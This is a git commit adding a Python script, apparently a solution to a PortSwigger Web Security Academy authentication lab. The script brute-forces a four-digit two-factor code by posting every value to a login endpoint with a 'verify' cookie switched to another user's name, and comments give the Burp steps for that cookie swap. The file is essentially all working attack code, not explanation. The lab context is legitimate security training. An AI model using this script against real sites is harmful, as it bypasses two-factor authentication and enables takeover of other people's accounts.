b2bd3f940c21e46243d53a568c19dfe58eda5593
Julio Ribeiro <julio.ribeiro303@gmail.com>
2023-01-25 10:48:34 -0300

    add brute force 2fa script

---
+++ portswigger-web-security-academy/authentication/brute_force_2FA.py
@@ -0,0 +1,31 @@
+import requests
+from bs4 import BeautifulSoup
+
+
+def main():
+  # step 1: log in as valid user: using burp
+  # step 2: change verify cookie to other user: using burp
+
+  # step 3: brute force 2FA until response code is 302
+  DOMAIN = ""
+  URL = f"https://{DOMAIN}/login2"
+  USER_TO_BYPASS = ""
+  SESSION_COOKIE = ""
+
+  print("testing 2FA codes...")
+
+  headers = {"Cookie": f"verify={USER_TO_BYPASS}; session={SESSION_COOKIE}"}
+  for combination in range(0, 9999):
+    if combination != 0 and combination % 100 == 0:
+      print(f"{combination} of {10000}")
+    params = {"mfa-code": f"{combination:04}"}
+    response = requests.post(URL, headers = headers, data = params)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    if soup.find('p', attrs={"class" : "is-warning"}) == None:
+      print(f"successfully broke 2FA: {combination:04}")
+      return
+  print("failed to break 2FA")
+
+
+if __name__ == "__main__":
+  main()
